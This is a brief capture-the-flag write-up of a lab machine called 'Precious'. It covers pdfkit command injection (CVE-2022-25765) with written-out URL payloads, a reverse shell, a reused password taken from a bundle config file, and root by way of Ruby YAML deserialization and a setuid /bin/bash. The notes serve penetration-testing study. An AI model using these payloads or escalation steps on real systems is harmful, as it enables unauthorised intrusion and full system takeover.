# precious

## enum

    - http web service - convert html to pdf
        - from response the lib is: pdfkit v0.8.6
        - pdfkit v0.8.6: CVE-2022-25765 command-injection
            - https://github.com/pdfkit/pdfkit/issues/517
            - command injection in url params
                - this payload: http://localhost:3000/?pwd=$(pwd)&user=$(whoami)


## pwn user

    - this payload: http://localhost:3000/?pwd=$(pwd)&user=$(whoami) cant run with the space char
        - command injection without space (payload all the thing)
        - use $IFS
    - on other hand, we can use the payload without bypass non-space-char
        - payload: http://example.com/?name=#{'%20`sleep 5`'}
        - ref: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
        - then we can have a rev shell.

    - currently we can command with ruby user.
        - enum files, we get henry's pwd in /home/ruby/.bundle/config.
        - ssh and get user.txt


## pri esc 2 pwn root

    - sudo -l
        Matching Defaults entries for henry on precious:
            env_reset, mail_badpass,
            secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

        User henry may run the following commands on precious:
            (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

    - we can run sudo ruby /opt/update_dependencies.rb
        - inside update_dependencies.rb, it load the YAML
        - we'll exploit the ruby yaml rce.
            - ref: https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
                - exploit code: https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml

    - we run the command: chmod +s /bin/bash
        - then run bash -p to run with root
        - with this mode we:
            - Turn on privileged mode.
            - If the shell is started with the effective user (group) id not  equal
                        to the real user (group) id, and the -p option is not supplied, these actions are taken and the effective user id is set to the real user id. 
            - in the simple word, we run with max pri. In this case is root.
    - finally we got root :).